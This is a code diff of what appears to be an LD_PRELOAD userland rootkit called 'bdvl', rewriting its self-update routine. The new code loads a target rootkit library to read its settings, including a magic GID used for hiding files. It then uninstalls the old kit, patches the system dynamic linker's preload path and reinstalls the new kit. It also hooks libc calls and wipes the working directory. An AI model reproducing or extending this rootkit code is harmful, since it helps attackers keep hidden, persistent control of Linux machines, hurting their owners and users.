@@ -1,86 +1,71 @@
-/* reads target sopath for the values of BDVLSO, INSTALL_DIR, OLD_PRELOAD & PRELOAD_FILE
- * & stores what it finds in an array. the result is returned.
- * NULL is returned, if either:
- *     return value of getfilesize on target sopath is 0,
- *     memory could not be allocated for the contents of sopath,
- *     memory could not be allocated for the array in which located values are stored,
- *     or target sopath could not be opened for reading. */
-char **bdvsearch(const char *sopath, int *cm){
-    off_t fsize, cfile;
-    unsigned char *buf;
-    FILE *fp;
-    size_t n;
-    int c=0, got, cmark, k;
-    char *markname, **values;
+/* resolves the imgay function in the target bdvl.so.
+ * once resolved, the function is called. output from the
+ * function call is then stored accordingly in the
+ * array allocated at the very beginning. */
+char **bdvsearch(const char *sopath){
+    char **ret = malloc(sizeof(char*)*4);
+    if(!ret) return NULL;
 
-    hook(CFOPEN);
+    void **handle=NULL, (*ptr)();
+    int filedes[2], i=0;
+    pid_t pid;
+    char buffer[2048], *bufdup, *buftok, *tokdup, *p;
+    ssize_t count;
+    size_t cfgsize;
 
-    fsize = getfilesize(sopath);
-    if(fsize == 0) return NULL;
-
-    buf = malloc(fsize+1);
-    if(!buf) return NULL;
-    memset(buf, 0, fsize+1);
-
-    values = malloc(sizeof(char*)*sizeofarr(marknames));
-    if(!values){
-        free(buf);
+    if(pipe(filedes) < 0){
+        free(ret);
         return NULL;
     }
 
-    fp = call(CFOPEN, sopath, "rb");
-    if(fp == NULL){
-        free(buf);
-        free(values);
+    pid = fork();
+    if(pid < 0){
+        free(ret);
+        return NULL;
+    }else if(pid == 0){
+        while(dup2(filedes[1], STDOUT_FILENO) < 0 && errno == EINTR);
+        close(filedes[1]);
+        close(filedes[0]);
+        ptr = getfuncptr(sopath, "imgay", handle);
+        ptr();
+        exit(0);
+    }
+    close(filedes[1]);
+    dlclose(&handle);
+
+    hook(CREAD);
+    usleep(30000);
+    count = (ssize_t)call(CREAD, filedes[0], buffer, sizeof(buffer)-1);
+    close(filedes[0]);
+    wait(NULL);
+
+    if(!count){
+        free(ret);
         return NULL;
     }
 
-    do{
-        n = fread(buf, 1, fsize, fp);
+    bufdup = strdup(buffer);
+    buftok = strtok(buffer, "\n");
+    while(buftok != NULL && i<4){
+        tokdup = strdup(buftok);
+        p = strchr(tokdup, ':')+1;
 
-        for(cmark=0; cmark < sizeofarr(marknames); cmark++){
-            c=0, got=0, k=0;
-            markname = marknames[cmark];
-
-            for(cfile=0; cfile < fsize && got != 1; cfile++){
-                if(buf[cfile] == markname[c]){ // character match
-                    if(c == strlen(markname)-1){
-                        values[cmark] = malloc(PATH_MAX);
-                        if(!values[cmark]){
-                            free(values);
-                            values=NULL;
-                            goto nopenope;
-                        }
-
-                        memset(values[cmark], 0, PATH_MAX);
-                        got=1; // get ready to retrieve value
-                    }
-                    c++;
-                }else c=0;
-
-                if(got){ // read to the end of the value. copy it.
-                    cfile++; // start at the beginning of the value...
-                    while(buf[cfile] != '\0')
-                        memcpy(&values[cmark][k++], &buf[cfile++], 1);
-                    values[cmark][k]='\0';
-                }
-            }
+        cfgsize = strlen(p)+1;
+        ret[i] = malloc(cfgsize);
+        if(!ret[i]){
+            free(ret);
+            ret = NULL;
+            goto nopenope;
         }
-    }while(n > 0);
-nopenope:
-    free(buf);
-    fclose(fp);
+        memset(ret[i], 0, cfgsize);
+        strncpy(ret[i++], p, cfgsize);
+        free(tokdup);
 
-    *cm = cmark;
-    return values;
-}
-
-void freevals(char **vals, int c){
-    for(int i=0; i<c; i++){
-        free(vals[i]);
-        vals[i] = NULL;
+        buftok = strtok(NULL, "\n");
     }
-    free(vals);
+nopenope:
+    free(bufdup);
+    return ret;
 }
 
 /* uninstall current installation. install target installation.
@@ -90,10 +75,10 @@ void freevals(char **vals, int c){
  *   2. HOMEDIR is not removed until the end if calling process (you) are in it installing bdvl.
  *   3. and of course..we reinstall with our new version at the very end.  */
 void bdvupdate(char *const argv[]){
-    char *aso=NULL, **values, status, *cwd;
-    char *bdvlso, *installdir, *oldpreload, *preloadpath;
-    char *curpreload=OLD_PRELOAD, *targetpreload;
-    int cmark, inhome=0, i;
+    char *aso=NULL, **values, *cwd, *curpreload;
+    char *bdvlso, *installdir, *preloadpath;
+    int inhome=0, i;
+    gid_t magicgid;
 
     /* first make sure there is a valid target bdvl.so in argv. */
     for(i=2; argv[i] != NULL; i++)
@@ -112,22 +97,13 @@ void bdvupdate(char *const argv[]){
     getchar();
 
     /* read important settings from target bdvl.so */
-    values = bdvsearch(aso, &cmark);
+    values = bdvsearch(aso);
     if(!values){
-        printf("Couldn't find settings.\n");
+        printf("Failed finding settings.\n");
         return;
     }
-    bdvlso     = values[0], installdir  = values[1],
-    oldpreload = values[2], preloadpath = values[3];
-
-    /* need to know if we're gonna be using preloadpath or oldpreload... */
-    printf("Is PATCH_DYNAMIC_LINKER defined in this new installation? (y/n): ");
-    status = getchar();
-    if(status != 'y' && status != 'Y' && status != 'n' && status != 'N'){
-        printf("Invalid reply...\n");
-        freevals(values, cmark);
-        return;
-    }
+    installdir = values[0], preloadpath = values[1],
+    bdvlso     = values[2], magicgid    = (gid_t)atoi(values[3]);
 
     /* uninstall current bdvl */
     printf("\nRemoving previous installation...\n");
@@ -147,18 +123,20 @@ void bdvupdate(char *const argv[]){
     printf("Removing bdvl paths\n");
     rmbdvpaths();
 
-    /* repatch kit's curpreload (OLD_PRELOAD/PRELOAD_FILE) to the new one... */
-    status == 'y' || status == 'Y' ? targetpreload = preloadpath : oldpreload;
+    curpreload = OLD_PRELOAD;
 #ifdef PATCH_DYNAMIC_LINKER
     curpreload = PRELOAD_FILE;
 #endif
     printf("Patching ld.so\n");
-    ldpatch(curpreload, targetpreload);
+    ldpatch(curpreload, preloadpath);
 
     /* now install new bdvl. */
-    bdvinstall(argv, installdir, bdvlso, targetpreload, MAGIC_GID);  // use MAGIC_GID value we have here.
-    freevals(values, cmark);
-    system("cat /dev/null"); // hide everything with actual new MAGIC_GID.
+    bdvinstall(argv, installdir, bdvlso, preloadpath, magicgid);
+    for(int i=0; i<4; i++){
+        free(values[i]);
+        values[i] = NULL;
+    }
+    free(values);
 
     // now we can eradicate...
     if(inhome) eradicatedir(HOMEDIR);
